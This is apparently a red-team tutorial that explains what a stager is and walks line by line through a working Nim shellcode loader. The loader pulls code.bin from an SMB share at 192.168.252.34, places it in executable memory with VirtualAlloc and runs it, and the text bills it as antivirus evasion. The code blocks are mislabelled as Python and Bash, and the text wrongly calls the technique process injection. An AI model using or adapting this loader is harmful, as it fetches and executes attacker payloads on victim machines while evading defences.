


### What is a stager ?

A stager is like the first step in a two-step attack. It's a small piece of code that is sent or delivered to a target system initially. The main job of the stager is to set up a connection to a server controlled by the attacker. Once the connection is established, the stager's role is to fetch and execute a larger, more powerful piece of malicious code (payload) from the attacker's server.


### A basic stager in nim that executes our shell code by making use of process injection, allowing AV evasion.


```python
import winim/lean 

  

var filename = "\\\\192.168.252.34\\smb\\code.bin"

  

var file: File = open(filename, fmRead) 

  

var filesize = file.getFileSize()

  

var shellcode = newSeq[byte](filesize) 

  

discard file.readBytes(shellcode, 0, filesize) 

  

type

	buf* = LPVOID

  

var res = VirtualAlloc(nil, filesize, MEM_COMMIT, PAGE_EXECUTE_READWRITE)

copyMem(res, shellcode[0].addr, filesize)

let f = cast[proc(){.nimcall.}](res)

f()
```



Let's look more closely at what each line of the code does:

```python
import winim/lean  # Library for interacting with the Windows API
```

This line imports the `winim/lean` module, which provides Nim bindings for the Windows API. It allows the Nim program to interact with Windows-specific functions.

```bash
var filename = "\\\\192.168.252.34\\smb\\code.bin"  # Location of the shellcode`
```

Here, a variable named `filename` is assigned the path of a file containing shellcode. The file is expected to be located at the specified network path.

```python
var file: File = open(filename, fmRead)  # Opening the file in read mode
```

This line opens the file specified by `filename` in read mode (`fmRead`). It uses the `open` function from the Windows API to create a `File` object.

```python
var filesize = file.getFileSize()  # Getting the filesize
```

The program retrieves the size of the opened file using the `getFileSize` method of the `file` object. This information is crucial for allocating the appropriate amount of memory.

```python
var shellcode = newSeq[byte](filesize) 
```

A Nim sequence (`newSeq`) named `shellcode` is created with a size equal to the previously obtained `filesize`. This sequence will be used to store the contents of the shellcode.

```python
discard file.readBytes(shellcode, 0, filesize)  #
```

The program reads the contents of the file into the `shellcode` sequence using the `readBytes` method of the `file` object. The `discard` keyword is used to suppress any unused result warning. The `filesize` specifies the amounts of bytes to be read into `shellcode` which is equal to the size of the `shellcode binary`.  

```python
type
  buf* = LPVOID
```

A type alias `buf` is defined, representing a buffer that will be used for memory allocation.

```python
var res = VirtualAlloc(nil, filesize, MEM_COMMIT, PAGE_EXECUTE_READWRITE)
```

The `VirtualAlloc` function is called to allocate a region of memory (`res`) that is large enough to accommodate the shellcode. The `MEM_COMMIT` flag indicates that the memory should be committed (reserved), and `PAGE_EXECUTE_READWRITE` specifies that the memory should be both executable and writable.

```python
copyMem(res, shellcode[0].addr, filesize)
```

This line of code is using the `CopyMem` function for copying `filesize` bytes of memory from the address pointed to by `shellcode[0].addr` to the memory location pointed to by `res`. The `shellcode` is the byte sequence that we had created earlier.

- `shellcode[0].addr`: It is the source memory location,  `[0]` specifies the address of the first element of the `shellcode` sequence. In short, this line is telling the program to start copying the bytes  from the very first element of the `shellcode` byte sequence.

```python
let f = cast[proc(){.nimcall.}](res)
```

A function pointer (`f`) is created by casting the allocated memory as a function pointer. The `{.nimcall.}` pragma indicates that the calling convention for the function should be Nim's default.

1. **`casting:`**
    
    - `cast`: In Nim, the `cast` keyword is used for explicit type conversion or casting. It allows you to convert a value from one type to another.
2. **`[proc(){.nimcall.}]`**:
    
    - This part specifies the target type to which we are casting. In this case, it's a procedure type with an empty parameter list `{}`. The `.{nimcall.}` annotation is used to indicate that the calling convention should follow Nim conventions.
3. **`(res)`**:
    
    - This is the value being cast. In this case, it's the result of the `VirtualAlloc` function, which is a pointer to the allocated memory.
4. **`let f = cast[proc(){.nimcall.}](res)`**:
    
    - The entire line performs the casting operation. It casts the pointer `res` to a Nim procedure type with the specified calling convention.
    - The purpose of casting `res` into a procedure type is to treat the allocated memory (`res`) as if it contains executable code in the form of a Nim procedure and execute it.

```python
f()
```

Finally, the function pointer `f` is dereferenced and called, effectively executing the shellcode.


